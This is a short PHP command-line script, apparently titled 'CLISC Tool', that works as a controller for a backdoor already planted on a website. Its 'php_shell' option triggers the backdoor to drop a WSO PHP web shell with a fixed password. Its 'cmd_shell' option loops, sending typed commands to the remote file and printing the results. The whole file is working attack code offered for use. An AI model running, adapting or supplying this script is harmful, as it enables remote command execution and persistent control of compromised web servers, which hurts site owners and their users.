<?php
error_reporting(0);
$orion = readline('Your Web URL: ');
$orion1 = readline('Your Filename: ');
echo "\n	\033[91mCLISC Tool\033[0m\n	Author: \033[35mOrion Hridoy\033[0m\n	Facebook: http://fb.com/orion.hridoy\n	\033[92mTools Commands\033[0m\n	1. Wso Php Shell (\033[92mphp_shell\033[0m)\n	2. Command Prompt Session (\033[92mcmd_shell\033[0m)\n\nEnter Your Command: ";
$pikachu = fopen("php://stdin","r");
$method = fgets($pikachu);
if(trim($method) == 'php_shell'){
	file_get_contents($orion."/".$orion1."?hridoy=orion");
	echo "\nShell Password: \033[92morion\033[0m\n\nShell URL: \033[92m".$orion."/hridoy.php\033[0m\n";
}
if(trim($method) == 'cmd_shell'){
while (1==1){
echo "\033[92m".file_get_contents($orion."/".$orion1."?orion=".urlencode(readline('Command: ')))."\033[0m\n";
}

}
?>